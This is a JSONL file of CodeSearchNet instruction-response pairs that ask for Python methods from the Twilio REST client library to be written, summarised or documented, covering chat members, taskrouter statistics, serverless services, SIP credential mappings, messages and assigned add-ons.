{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates the MemberInstance :param unicode role_sid: The Role assigned to this member. :param unicode last_consumed_message_index: An Integer representing index of the last Message this Member has read within this Channel :returns: Updated MemberInstance :rtype: twilio.rest.chat.v1.service.channel.member.MemberInstance", "response": "def update(self, role_sid=values.unset,\n               last_consumed_message_index=values.unset):\n        \"\"\"\n        Update the MemberInstance\n\n        :param unicode role_sid: The Role assigned to this member.\n        :param unicode last_consumed_message_index: An Integer representing index of the last Message this Member has read within this Channel\n\n        :returns: Updated MemberInstance\n        :rtype: twilio.rest.chat.v1.service.channel.member.MemberInstance\n        \"\"\"\n        data = values.of({'RoleSid': role_sid, 'LastConsumedMessageIndex': last_consumed_message_index, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return MemberInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update(self, role_sid=values.unset,\n               last_consumed_message_index=values.unset):\n        \"\"\"\n        Update the MemberInstance\n\n        :param unicode role_sid: The Role assigned to this member.\n        :param unicode last_consumed_message_index: An Integer representing index of the last Message this Member has read within this Channel\n\n        :returns: Updated MemberInstance\n        :rtype: twilio.rest.chat.v1.service.channel.member.MemberInstance\n        \"\"\"\n        return self._proxy.update(\n            role_sid=role_sid,\n            last_consumed_message_index=last_consumed_message_index,\n        )", "response": "Updates the MemberInstance with the specified parameters."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get(self):\n        return WorkflowRealTimeStatisticsContext(\n            self._version,\n            workspace_sid=self._solution['workspace_sid'],\n            workflow_sid=self._solution['workflow_sid'],\n        )", "response": "Constructs a WorkflowRealTimeStatisticsContext\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_real_time_statistics.WorkflowRealTimeStatisticsContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_real_time_statistics.WorkflowRealTimeStatisticsContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of WorkflowRealTimeStatisticsInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of WorkflowRealTimeStatisticsInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_real_time_statistics.WorkflowRealTimeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_real_time_statistics.WorkflowRealTimeStatisticsInstance\n        \"\"\"\n        return WorkflowRealTimeStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            workflow_sid=self._solution['workflow_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: WorkflowRealTimeStatisticsContext for this WorkflowRealTimeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_real_time_statistics.WorkflowRealTimeStatisticsContext\n        \"\"\"\n        if self._context is None:\n            self._context = WorkflowRealTimeStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                workflow_sid=self._solution['workflow_sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create(self, unique_name, friendly_name, include_credentials=values.unset):\n        data = values.of({\n            'UniqueName': unique_name,\n            'FriendlyName': friendly_name,\n            'IncludeCredentials': include_credentials,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, )", "response": "Create a new ServiceInstance with the given unique name and friendly name."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the environments :returns: twilio.rest.serverless.v1.service.environment.EnvironmentList :rtype: twilio.rest.serverless.v1.service.environment.EnvironmentList", "response": "def environments(self):\n        \"\"\"\n        Access the environments\n\n        :returns: twilio.rest.serverless.v1.service.environment.EnvironmentList\n        :rtype: twilio.rest.serverless.v1.service.environment.EnvironmentList\n        \"\"\"\n        if self._environments is None:\n            self._environments = EnvironmentList(self._version, service_sid=self._solution['sid'], )\n        return self._environments"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef functions(self):\n        if self._functions is None:\n            self._functions = FunctionList(self._version, service_sid=self._solution['sid'], )\n        return self._functions", "response": "Access the functions\n\n        :returns: twilio.rest.serverless.v1.service.function.FunctionList\n        :rtype: twilio.rest.serverless.v1.service.function.FunctionList"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef assets(self):\n        if self._assets is None:\n            self._assets = AssetList(self._version, service_sid=self._solution['sid'], )\n        return self._assets", "response": "Access the assets\n\n        :returns: twilio.rest.serverless.v1.service.asset.AssetList\n        :rtype: twilio.rest.serverless.v1.service.asset.AssetList"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the builds :returns: twilio.rest.serverless.v1.service.build.BuildList :rtype: twilio.rest.serverless.v1.service.build.BuildList", "response": "def builds(self):\n        \"\"\"\n        Access the builds\n\n        :returns: twilio.rest.serverless.v1.service.build.BuildList\n        :rtype: twilio.rest.serverless.v1.service.build.BuildList\n        \"\"\"\n        if self._builds is None:\n            self._builds = BuildList(self._version, service_sid=self._solution['sid'], )\n        return self._builds"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, include_credentials=values.unset, friendly_name=values.unset):\n        return self._proxy.update(include_credentials=include_credentials, friendly_name=friendly_name, )", "response": "Update the ServiceInstance\n        Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a new AuthCallsCredentialListMappingInstance", "response": "def create(self, credential_list_sid):\n        \"\"\"\n        Create a new AuthCallsCredentialListMappingInstance\n\n        :param unicode credential_list_sid: The SID of the CredentialList resource to map to the SIP domain\n\n        :returns: Newly created AuthCallsCredentialListMappingInstance\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_credential_list_mapping.AuthCallsCredentialListMappingInstance\n        \"\"\"\n        data = values.of({'CredentialListSid': credential_list_sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AuthCallsCredentialListMappingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconstruct a AuthCallsCredentialListMappingContext :param sid: The unique string that identifies the resource :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_credential_list_mapping.AuthCallsCredentialListMappingContext :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_credential_list_mapping.AuthCallsCredentialListMappingContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a AuthCallsCredentialListMappingContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_credential_list_mapping.AuthCallsCredentialListMappingContext\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_credential_list_mapping.AuthCallsCredentialListMappingContext\n        \"\"\"\n        return AuthCallsCredentialListMappingContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds an instance of AuthCallsCredentialListMappingInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AuthCallsCredentialListMappingInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_credential_list_mapping.AuthCallsCredentialListMappingInstance\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.auth_calls_credential_list_mapping.AuthCallsCredentialListMappingInstance\n        \"\"\"\n        return AuthCallsCredentialListMappingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get(self, sid):\n        return PhoneNumberContext(self._version, trunk_sid=self._solution['trunk_sid'], sid=sid, )", "response": "Constructs a PhoneNumberContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.trunking.v1.trunk.phone_number.PhoneNumberContext\n        :rtype: twilio.rest.trunking.v1.trunk.phone_number.PhoneNumberContext"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return PhoneNumberInstance(self._version, payload, trunk_sid=self._solution['trunk_sid'], )", "response": "Build an instance of PhoneNumberInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: PhoneNumberContext for this PhoneNumberInstance\n        :rtype: twilio.rest.trunking.v1.trunk.phone_number.PhoneNumberContext\n        \"\"\"\n        if self._context is None:\n            self._context = PhoneNumberContext(\n                self._version,\n                trunk_sid=self._solution['trunk_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconstruct a TaskQueueCumulativeStatisticsContext :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_cumulative_statistics.TaskQueueCumulativeStatisticsContext :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_cumulative_statistics.TaskQueueCumulativeStatisticsContext", "response": "def get(self):\n        \"\"\"\n        Constructs a TaskQueueCumulativeStatisticsContext\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_cumulative_statistics.TaskQueueCumulativeStatisticsContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_cumulative_statistics.TaskQueueCumulativeStatisticsContext\n        \"\"\"\n        return TaskQueueCumulativeStatisticsContext(\n            self._version,\n            workspace_sid=self._solution['workspace_sid'],\n            task_queue_sid=self._solution['task_queue_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding an instance of TaskQueueCumulativeStatisticsInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of TaskQueueCumulativeStatisticsInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_cumulative_statistics.TaskQueueCumulativeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_cumulative_statistics.TaskQueueCumulativeStatisticsInstance\n        \"\"\"\n        return TaskQueueCumulativeStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            task_queue_sid=self._solution['task_queue_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _proxy(self):\n        if self._context is None:\n            self._context = TaskQueueCumulativeStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                task_queue_sid=self._solution['task_queue_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the SettingsInstance :param bool dialing_permissions_inheritance: `true` for this sub-account to inherit voice dialing permissions from the Master Project; otherwise `false` :returns: Updated SettingsInstance :rtype: twilio.rest.voice.v1.dialing_permissions.settings.SettingsInstance", "response": "def update(self, dialing_permissions_inheritance=values.unset):\n        \"\"\"\n        Update the SettingsInstance\n\n        :param bool dialing_permissions_inheritance: `true` for this sub-account to inherit voice dialing permissions from the Master Project; otherwise `false`\n\n        :returns: Updated SettingsInstance\n        :rtype: twilio.rest.voice.v1.dialing_permissions.settings.SettingsInstance\n        \"\"\"\n        data = values.of({'DialingPermissionsInheritance': dialing_permissions_inheritance, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SettingsInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates an instance context for the current node", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: SettingsContext for this SettingsInstance\n        :rtype: twilio.rest.voice.v1.dialing_permissions.settings.SettingsContext\n        \"\"\"\n        if self._context is None:\n            self._context = SettingsContext(self._version, )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nupdating the SettingsInstance :param bool dialing_permissions_inheritance: `true` for this sub-account to inherit voice dialing permissions from the Master Project; otherwise `false` :returns: Updated SettingsInstance :rtype: twilio.rest.voice.v1.dialing_permissions.settings.SettingsInstance", "response": "def update(self, dialing_permissions_inheritance=values.unset):\n        \"\"\"\n        Update the SettingsInstance\n\n        :param bool dialing_permissions_inheritance: `true` for this sub-account to inherit voice dialing permissions from the Master Project; otherwise `false`\n\n        :returns: Updated SettingsInstance\n        :rtype: twilio.rest.voice.v1.dialing_permissions.settings.SettingsInstance\n        \"\"\"\n        return self._proxy.update(dialing_permissions_inheritance=dialing_permissions_inheritance, )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a new DeploymentInstance", "response": "def create(self, build_sid):\n        \"\"\"\n        Create a new DeploymentInstance\n\n        :param unicode build_sid: The build_sid\n\n        :returns: Newly created DeploymentInstance\n        :rtype: twilio.rest.serverless.v1.service.environment.deployment.DeploymentInstance\n        \"\"\"\n        data = values.of({'BuildSid': build_sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return DeploymentInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            environment_sid=self._solution['environment_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get(self, sid):\n        return DeploymentContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            environment_sid=self._solution['environment_sid'],\n            sid=sid,\n        )", "response": "Constructs a DeploymentContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.serverless.v1.service.environment.deployment.DeploymentContext\n        :rtype: twilio.rest.serverless.v1.service.environment.deployment.DeploymentContext"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nbuilding an instance of DeploymentInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of DeploymentInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.serverless.v1.service.environment.deployment.DeploymentInstance\n        :rtype: twilio.rest.serverless.v1.service.environment.deployment.DeploymentInstance\n        \"\"\"\n        return DeploymentInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            environment_sid=self._solution['environment_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = DeploymentContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                environment_sid=self._solution['environment_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self, sid):\n        return FieldTypeContext(self._version, assistant_sid=self._solution['assistant_sid'], sid=sid, )", "response": "Constructs a FieldTypeContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.autopilot.v1.assistant.field_type.FieldTypeContext\n        :rtype: twilio.rest.autopilot.v1.assistant.field_type.FieldTypeContext"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_instance(self, payload):\n        return FieldTypeInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )", "response": "Build an instance of FieldTypeInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the field_values :returns: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueList :rtype: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueList", "response": "def field_values(self):\n        \"\"\"\n        Access the field_values\n\n        :returns: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueList\n        :rtype: twilio.rest.autopilot.v1.assistant.field_type.field_value.FieldValueList\n        \"\"\"\n        if self._field_values is None:\n            self._field_values = FieldValueList(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                field_type_sid=self._solution['sid'],\n            )\n        return self._field_values"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an instance context for the record type", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: FieldTypeContext for this FieldTypeInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.field_type.FieldTypeContext\n        \"\"\"\n        if self._context is None:\n            self._context = FieldTypeContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef update(self, friendly_name=values.unset, unique_name=values.unset):\n        return self._proxy.update(friendly_name=friendly_name, unique_name=unique_name, )", "response": "Updates the FieldTypeInstance\n        properties"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a new MessageInstance", "response": "def create(self, to, status_callback=values.unset, application_sid=values.unset,\n               max_price=values.unset, provide_feedback=values.unset,\n               validity_period=values.unset, force_delivery=values.unset,\n               smart_encoded=values.unset, interactive_data=values.unset,\n               force_opt_in=values.unset, from_=values.unset,\n               messaging_service_sid=values.unset, body=values.unset,\n               media_url=values.unset):\n        \"\"\"\n        Create a new MessageInstance\n\n        :param unicode to: The destination phone number\n        :param unicode status_callback: The URL we should call to send status information to your application\n        :param unicode application_sid: The application to use for callbacks\n        :param unicode max_price: The total maximum price up to 4 decimal places in US dollars acceptable for the message to be delivered.\n        :param bool provide_feedback: Whether to confirm delivery of the message\n        :param unicode validity_period: The number of seconds that the message can remain in our outgoing queue.\n        :param bool force_delivery: Reserved\n        :param bool smart_encoded: Whether to detect Unicode characters that have a similar GSM-7 character and replace them\n        :param unicode interactive_data: A JSON string that represents an interactive message\n        :param bool force_opt_in: Whether to forcefully whitelist a from:to pair\n        :param unicode from_: The phone number that initiated the message\n        :param unicode messaging_service_sid: The SID of the Messaging Service you want to associate with the message.\n        :param unicode body: The text of the message you want to send. Can be up to 1,600 characters in length.\n        :param unicode media_url: The URL of the media to send with the message\n\n        :returns: Newly created MessageInstance\n        :rtype: twilio.rest.api.v2010.account.message.MessageInstance\n        \"\"\"\n        data = values.of({\n            'To': to,\n            'From': from_,\n            'MessagingServiceSid': messaging_service_sid,\n            'Body': body,\n            'MediaUrl': serialize.map(media_url, lambda e: e),\n            'StatusCallback': status_callback,\n            'ApplicationSid': application_sid,\n            'MaxPrice': max_price,\n            'ProvideFeedback': provide_feedback,\n            'ValidityPeriod': validity_period,\n            'ForceDelivery': force_delivery,\n            'SmartEncoded': smart_encoded,\n            'InteractiveData': interactive_data,\n            'ForceOptIn': force_opt_in,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return MessageInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef stream(self, to=values.unset, from_=values.unset,\n               date_sent_before=values.unset, date_sent=values.unset,\n               date_sent_after=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams MessageInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode to: Filter by messages sent to this number\n        :param unicode from_: Filter by from number\n        :param datetime date_sent_before: Filter by date sent\n        :param datetime date_sent: Filter by date sent\n        :param datetime date_sent_after: Filter by date sent\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.message.MessageInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            to=to,\n            from_=from_,\n            date_sent_before=date_sent_before,\n            date_sent=date_sent,\n            date_sent_after=date_sent_after,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])", "response": "Streams the MessageInstance records from the API as a generator. This operation lazily loads records as efficiently as possible until the limit is reached."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef list(self, to=values.unset, from_=values.unset,\n             date_sent_before=values.unset, date_sent=values.unset,\n             date_sent_after=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists MessageInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode to: Filter by messages sent to this number\n        :param unicode from_: Filter by from number\n        :param datetime date_sent_before: Filter by date sent\n        :param datetime date_sent: Filter by date sent\n        :param datetime date_sent_after: Filter by date sent\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.message.MessageInstance]\n        \"\"\"\n        return list(self.stream(\n            to=to,\n            from_=from_,\n            date_sent_before=date_sent_before,\n            date_sent=date_sent,\n            date_sent_after=date_sent_after,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams the MessageInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nretrieve a single page of MessageInstance records from the API. Request is executed immediately", "response": "def page(self, to=values.unset, from_=values.unset,\n             date_sent_before=values.unset, date_sent=values.unset,\n             date_sent_after=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of MessageInstance records from the API.\n        Request is executed immediately\n\n        :param unicode to: Filter by messages sent to this number\n        :param unicode from_: Filter by from number\n        :param datetime date_sent_before: Filter by date sent\n        :param datetime date_sent: Filter by date sent\n        :param datetime date_sent_after: Filter by date sent\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of MessageInstance\n        :rtype: twilio.rest.api.v2010.account.message.MessagePage\n        \"\"\"\n        params = values.of({\n            'To': to,\n            'From': from_,\n            'DateSent<': serialize.iso8601_datetime(date_sent_before),\n            'DateSent': serialize.iso8601_datetime(date_sent),\n            'DateSent>': serialize.iso8601_datetime(date_sent_after),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return MessagePage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get(self, sid):\n        return MessageContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )", "response": "Constructs a MessageContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.message.MessageContext\n        :rtype: twilio.rest.api.v2010.account.message.MessageContext"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return MessageInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of MessageInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nupdating the MessageInstance :param unicode body: The text of the message you want to send :returns: Updated MessageInstance :rtype: twilio.rest.api.v2010.account.message.MessageInstance", "response": "def update(self, body):\n        \"\"\"\n        Update the MessageInstance\n\n        :param unicode body: The text of the message you want to send\n\n        :returns: Updated MessageInstance\n        :rtype: twilio.rest.api.v2010.account.message.MessageInstance\n        \"\"\"\n        data = values.of({'Body': body, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return MessageInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the media :returns: twilio.rest.api.v2010.account.message.media.MediaList :rtype: twilio.rest.api.v2010.account.message.media.MediaList", "response": "def media(self):\n        \"\"\"\n        Access the media\n\n        :returns: twilio.rest.api.v2010.account.message.media.MediaList\n        :rtype: twilio.rest.api.v2010.account.message.media.MediaList\n        \"\"\"\n        if self._media is None:\n            self._media = MediaList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                message_sid=self._solution['sid'],\n            )\n        return self._media"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the feedback :returns: twilio.rest.api.v2010.account.message.feedback.FeedbackList :rtype: twilio.rest.api.v2010.account.message.feedback.FeedbackList", "response": "def feedback(self):\n        \"\"\"\n        Access the feedback\n\n        :returns: twilio.rest.api.v2010.account.message.feedback.FeedbackList\n        :rtype: twilio.rest.api.v2010.account.message.feedback.FeedbackList\n        \"\"\"\n        if self._feedback is None:\n            self._feedback = FeedbackList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                message_sid=self._solution['sid'],\n            )\n        return self._feedback"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = MessageContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create(self, installed_add_on_sid):\n        data = values.of({'InstalledAddOnSid': installed_add_on_sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AssignedAddOnInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            resource_sid=self._solution['resource_sid'],\n        )", "response": "Create a new AssignedAddOnInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconstruct a AssignedAddOnContext :param sid: The unique string that identifies the resource :returns: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.AssignedAddOnContext :rtype: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.AssignedAddOnContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a AssignedAddOnContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.AssignedAddOnContext\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.AssignedAddOnContext\n        \"\"\"\n        return AssignedAddOnContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            resource_sid=self._solution['resource_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return AssignedAddOnInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            resource_sid=self._solution['resource_sid'],\n        )", "response": "Build an instance of AssignedAddOnInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfetches a AssignedAddOnInstance :returns: Fetched AssignedAddOnInstance :rtype: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.AssignedAddOnInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a AssignedAddOnInstance\n\n        :returns: Fetched AssignedAddOnInstance\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.AssignedAddOnInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return AssignedAddOnInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            resource_sid=self._solution['resource_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the extensions :returns: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.assigned_add_on_extension.AssignedAddOnExtensionList :rtype: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.assigned_add_on_extension.AssignedAddOnExtensionList", "response": "def extensions(self):\n        \"\"\"\n        Access the extensions\n\n        :returns: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.assigned_add_on_extension.AssignedAddOnExtensionList\n        :rtype: twilio.rest.api.v2010.account.incoming_phone_number.assigned_add_on.assigned_add_on_extension.AssignedAddOnExtensionList\n        \"\"\"\n        if self._extensions is None:\n            self._extensions = AssignedAddOnExtensionList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                resource_sid=self._solution['resource_sid'],\n                assigned_add_on_sid=self._solution['sid'],\n            )\n        return self._extensions"}
